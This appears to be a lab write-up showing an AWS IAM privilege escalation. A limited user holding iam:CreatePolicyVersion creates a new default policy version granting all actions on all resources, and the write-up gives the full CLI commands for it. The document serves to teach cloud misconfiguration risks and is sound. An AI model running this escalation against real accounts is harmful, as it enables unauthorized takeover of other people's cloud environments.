# IAM Privilege Escalation via Policy Versioning

## Scenario

This exercise demonstrates an IAM privilege escalation caused by an overly permissive policy.

The `limiteduser` initially had restricted permissions, but was allowed to create new versions of the IAM policy attached to itself.

## Initial Access

The AWS CLI profile used for the limited user was:

```bash
aws sts get-caller-identity --profile masterclasslimiteduser
```

An administrative IAM action was tested:

```bash
aws iam list-users --profile masterclasslimiteduser
```

Initially, this action was denied because the user did not have permission to list IAM users.

## Identify the Attached Policy

```bash
aws iam list-attached-user-policies \
  --user-name limiteduser \
  --profile masterclasslimiteduser
```

The attached customer-managed policy was:

`policyversionmanager`

## Inspect the Policy

```bash
aws iam get-policy \
  --policy-arn "arn:aws:iam::<ACCOUNT-ID>:policy/policyversionmanager" \
  --profile masterclasslimiteduser
```

The default policy version was `v1`.

The policy document was retrieved using:

```bash
aws iam get-policy-version \
  --policy-arn "arn:aws:iam::<ACCOUNT-ID>:policy/policyversionmanager" \
  --version-id v1 \
  --profile masterclasslimiteduser
```

The policy allowed the following actions:

- `iam:ListAttachedUserPolicies`
- `iam:GetPolicy`
- `iam:GetPolicyVersion`
- `iam:CreatePolicyVersion`

## Privilege Escalation

The dangerous permission was:

`iam:CreatePolicyVersion`

Because the user could create a new version of the policy that controlled its own permissions, a new policy version was created with broader privileges:

```bash
aws iam create-policy-version \
  --policy-arn "arn:aws:iam::<ACCOUNT-ID>:policy/policyversionmanager" \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default \
  --profile masterclasslimiteduser
```

This created a new policy version and made it the default version.

The new policy allowed all actions on all resources:

```json
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

## Verify the Escalation

After the new policy version became the default, the previously denied command succeeded:

```bash
aws iam list-users --profile masterclasslimiteduser
```

This demonstrated that the limited user had escalated its effective permissions.

## Key Lesson

Permissions that allow a user to modify IAM policies can result in privilege escalation.

A user may initially appear to have limited permissions, but if they can modify or create a new version of a policy that grants their own access, they may be able to increase their privileges.

## Cleanup

All users, groups, roles, policies, policy versions, and access keys created for the lab were removed after completing the exercise.

AWS credentials and access keys are not stored in this repository.
